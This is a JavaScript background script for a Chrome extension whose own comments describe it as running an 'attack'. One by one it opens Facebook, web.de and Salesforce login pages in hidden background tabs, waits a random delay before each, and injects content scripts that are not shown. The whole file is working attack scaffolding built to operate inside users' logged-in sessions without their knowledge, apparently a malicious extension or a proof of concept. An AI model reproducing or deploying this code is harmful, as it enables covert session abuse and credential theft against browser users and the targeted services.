var urls = ['https://facebook.com', 'http://web.de', 'https://login.salesforce.com/'];

// Listen for messages from content script
chrome.runtime.onMessage.addListener(function(message, sender) {
	
	// If message origins from tab and message status is 'finished' ,
	// close sender tab and execute next attack.
	if(sender.tab && message.status === 'finished') {
		chrome.tabs.remove(sender.tab.id);
		executeAttack();
	}
});

function openPageInBackgroundWindow(url) {
	
	// Options to query a tab. Tab is not in the currently 
	// active window and not a browser intern window.
	var queryOptions = {
		currentWindow: false,
		windowType: "normal"
	}

	// Query for tabs
	chrome.tabs.query(queryOptions, function (tabs) {		
		if(tabs.length === 0) {
			executeAttack();
			return;
		}

		// Options to create a new tab. Tab is opened in window of querried tab.
		var createOptions = {
			url: url, 
			windowId: tabs[0].windowId
		};

		// Create new tab with targeted web page
		chrome.tabs.create(createOptions, function(tab) {

			// Wait until tab has finished loading		
			var interval = setInterval(function() {
				chrome.tabs.get(tab.id, function(tab) {
					if(tab.status === 'complete') {
						clearInterval(interval);
						
						// Execute content scripts
						chrome.tabs.executeScript(tab.id, {file: 'jquery.js'});
						chrome.tabs.executeScript(tab.id, {file: 'content.js'});
					}
				});
			}, 100);
		});
		
	});
}

// Execute next attack delayed
function executeAttack() { 
	setTimeout(function() {
		if(urls.length > 0) {
			openPageInBackgroundWindow(urls.pop());	
		}
	}, Math.random() * 10000);
}

// Start first attack.
executeAttack();
